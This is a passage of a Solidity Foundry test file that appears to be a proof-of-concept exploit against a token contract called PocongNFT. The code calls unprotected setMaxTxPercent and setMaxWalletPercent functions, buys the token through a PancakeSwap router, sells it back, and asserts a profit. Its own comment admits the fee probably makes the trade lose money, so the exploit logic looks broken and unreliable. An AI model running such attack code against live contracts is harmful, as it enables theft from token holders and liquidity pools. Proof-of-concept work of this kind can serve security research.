        vm.label(uniswapV2Pair, "PancakePair");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(attacker).balance;

        // Step 1: Remove transaction limits by setting max tx to 100%
        PocongNFT(TARGET).setMaxTxPercent(100);

        // Step 2: Remove wallet limits by setting max wallet to 100%
        PocongNFT(TARGET).setMaxWalletPercent(100);

        // Step 3: Buy some tokens from PancakeSwap
        // First, approve router to spend our ETH
        // We'll buy with 1 ETH
        uint256 amountETH = 1 ether;

        // Get the WETH address from router
        address weth = IUniswapV2Router02(UNISWAP_ROUTER).WETH();

        // Create path: WETH -> TARGET
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        // Swap ETH for tokens
        IUniswapV2Router02 router = IUniswapV2Router02(UNISWAP_ROUTER);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amountETH}(
            0, // accept any amount
            path,
            attacker,
            block.timestamp + 1000
        );

        // Step 4: Sell all tokens back for ETH
        // Get our token balance
        uint256 tokenBalance = PocongNFT(TARGET).balanceOf(attacker);
        require(tokenBalance > 0, "No tokens bought");

        // Approve router to spend our tokens
        PocongNFT(TARGET).approve(address(router), tokenBalance);

        // Create reverse path: TARGET -> WETH
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = weth;

        // Swap tokens for ETH
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0, // accept any amount
            sellPath,
            attacker,
            block.timestamp + 1000
        );

        // Check if we made profit (though with 10% fee, we likely lost money)
        uint256 finalBalance = address(attacker).balance;
        require(finalBalance > initialBalance, "No profit made");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

